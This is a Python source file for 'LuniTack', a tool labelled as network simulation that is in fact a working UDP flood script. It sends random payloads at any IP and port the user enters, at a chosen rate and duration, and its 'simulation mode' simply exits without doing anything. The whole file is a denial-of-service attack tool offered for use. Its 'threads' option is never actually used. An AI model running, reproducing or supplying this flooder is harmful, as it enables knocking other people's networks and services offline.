import socket
import threading
import random
import time
import sys
import logging
import psutil
import ipaddress
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
import argparse
import os
import json
import traceback
from rich.prompt import Prompt, Confirm
from concurrent.futures import ThreadPoolExecutor

class ColorConsole:
    def __init__(self):
        self.console = Console()
        self.lock = threading.Lock()
    
    def header(self, text):
        with self.lock:
            self.console.print(Panel.fit(text, border_style="bold blue"))
    
    def info(self, text):
        with self.lock:
            self.console.print(f"[bold cyan]ℹ️ {text}[/bold cyan]")
    
    def warning(self, text):
        with self.lock:
            self.console.print(f"[bold yellow]⚠️ {text}[/bold yellow]")
    
    def error(self, text):
        with self.lock:
            self.console.print(f"[bold red]❌ {text}[/bold red]")
    
    def success(self, text):
        with self.lock:
            self.console.print(f"[bold green]✅ {text}[/bold green]")

class ThreadSafeCounter:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()
    
    def increment(self, amount=1):
        with self._lock:
            self._value += amount
    
    @property
    def value(self):
        with self._lock:
            return self._value

class AttackSimulator:
    def __init__(self, console, target_ip, target_port, duration, threads, rate_limit, payload_size):
        self.console = console
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads_count = threads
        self.rate_limit = rate_limit
        self.payload_size = payload_size
        self.total_sent = ThreadSafeCounter()
        self.stop_event = threading.Event()
    
    def perform_attack(self, thread_id):
        timeout = time.time() + self.duration
        sent = 0

        try:
            while time.time() < timeout and not self.stop_event.is_set():
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        payload = random.randbytes(self.payload_size)
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        sent += 1
                        self.total_sent.increment()
                        time.sleep(1 / self.rate_limit)
                
                except socket.error as e:
                    self.console.error(f"Thread {thread_id} Socket Error: {e}")
                    break
                except Exception as e:
                    self.console.error(f"Thread {thread_id} Error: {e}")
                    break
        
        except KeyboardInterrupt:
            self.stop_event.set()
        
        return sent

    def run_attack(self):
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeRemainingColumn()
        ) as progress:
            task = progress.add_task(f"[green]Attacking {self.target_ip}:{self.target_port}", total=self.duration)
            
            start_time = time.time()
            while not self.stop_event.is_set() and progress.tasks[task].completed < self.duration:
                elapsed = time.time() - start_time
                progress.update(task, completed=elapsed)
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        payload = random.randbytes(self.payload_size)
                        sock.sendto(payload, (self.target_ip, self.target_port))
                        self.total_sent.increment()
                        time.sleep(1 / self.rate_limit)
                except socket.error as e:
                    self.console.error(f"Socket Error: {e}")
                except Exception as e:
                    self.console.error(f"Error: {e}")


def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def get_interactive_input(console):
    console.header("LuniTack: Interactive Configuration")
    
    while True:
        target_ip = Prompt.ask("[bold blue]Enter Target IP[/bold blue]")
        if validate_ip(target_ip):
            break
        console.error("Invalid IP address. Please try again.")
    
    while True:
        target_port = Prompt.ask("[bold blue]Enter Target Port[/bold blue]", default="80")
        try:
            port = int(target_port)
            if 1 <= port <= 65535:
                break
            console.error("Port must be between 1 and 65535.")
        except ValueError:
            console.error("Invalid port number.")
    
    duration = Prompt.ask("[bold blue]Attack Duration (seconds)[/bold blue]", default="60")
    threads = Prompt.ask("[bold blue]Number of Threads[/bold blue]", default="4")
    rate_limit = Prompt.ask("[bold blue]Packets per Second[/bold blue]", default="100")
    payload_size = Prompt.ask("[bold blue]Payload Size (bytes)[/bold blue]", default="1024")
    simulate = Confirm.ask("[bold blue]Enable Simulation Mode?[/bold blue]", default=False)
    
    return {
        'ip': target_ip,
        'port': int(port),
        'duration': int(duration),
        'threads': int(threads),
        'rate': int(rate_limit),
        'payload': int(payload_size),
        'simulate': simulate
    }

def main():
    console = ColorConsole()
    console.header("LuniTack: Network Simulation Tool v2.2")
    
    parser = argparse.ArgumentParser(description="Advanced Network Simulation Tool")
    parser.add_argument("--ip", help="Target IP address")
    parser.add_argument("--port", type=int, help="Target port (1-65535)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=4, help="Number of attack threads")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second rate limit")
    parser.add_argument("--payload", type=int, default=1024, help="Payload size in bytes")
    parser.add_argument("--simulate", action="store_true", help="Enable simulation mode")
    
    args = parser.parse_args()

    try:
        if not args.ip or not args.port:
            console.warning("Missing required arguments. Entering interactive mode.")
            interactive_args = get_interactive_input(console)
            args = argparse.Namespace(**interactive_args)
        
        if args.simulate:
            console.info("Simulation mode: No packets will be sent.")
            input("Press Enter to exit...")
            return

        attack_simulator = AttackSimulator(
            console, args.ip, args.port, args.duration, 
            args.threads, args.rate, args.payload
        )
        
        console.info(f"Targeting {args.ip}:{args.port}")
        console.info(f"Duration: {args.duration}s | Threads: {args.threads}")
        
        attack_simulator.run_attack()
        
        result_table = Table(title="Attack Summary")
        result_table.add_column("Metric", style="cyan")
        result_table.add_column("Value", style="magenta")
        
        result_table.add_row("Target", f"{args.ip}:{args.port}")
        result_table.add_row("Threads", str(args.threads))
        result_table.add_row("Rate Limit", f"{args.rate} packets/s")
        result_table.add_row("Total Packets", str(attack_simulator.total_sent.value))
        
        console.console.print(result_table)
        console.success("Attack simulation completed successfully.")
        
        input("Press Enter to exit...")

    except ValueError as ve:
        console.error(f"Invalid input: {ve}")
    except Exception as e:
        console.error(f"Unexpected error: {e}")
        console.error(traceback.format_exc())
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
